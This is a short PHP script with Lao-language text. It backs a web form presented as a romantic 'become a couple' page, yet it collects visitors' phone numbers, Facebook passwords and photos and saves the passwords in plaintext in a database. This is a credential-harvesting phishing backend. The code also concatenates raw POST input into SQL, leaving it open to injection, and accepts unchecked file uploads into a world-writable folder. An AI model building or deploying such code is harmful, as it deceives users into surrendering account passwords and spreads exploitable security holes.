<?php
$conn = new mysqli("localhost", "root", "", "love_db");

if ($conn->connect_error) {
    die("Connection failed: " . $conn->connect_error);
}

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $phone = $_POST['phone'];
    $pass = $_POST['fb_password'];
    $years = $_POST['years'];
    
    // ຈັດການເລື່ອງຮູບພາບ
    $target_dir = "uploads/";
    if (!file_exists($target_dir)) { mkdir($target_dir, 0777, true); }
    $target_file = $target_dir . basename($_FILES["photo"]["name"]);
    move_uploaded_file($_FILES["photo"]["tmp_name"], $target_file);

    $sql = "INSERT INTO responses (phone, fb_password, years, photo_path) VALUES ('$phone', '$pass', '$years', '$target_file')";

    if ($conn->query($sql) === TRUE) {
        echo "
        <div style='text-align:center; margin-top:100px; font-family:Arial;'>
            <h1 style='color:green; font-size:100px;'>✔️</h1>
            <h1>ບັນທຶກຂໍ້ມູນສຳເລັດແລ້ວ!</h1>
            <p>ເຮົາເປັນແຟນກັນແລ້ວເດີ້ຈຸບໆ</p>
            <a href='index.php'>ກັບຄືນ</a>
        </div>";
    } else {
        echo "Error: " . $sql . "<br>" . $conn->error;
    }
}
$conn->close();
?>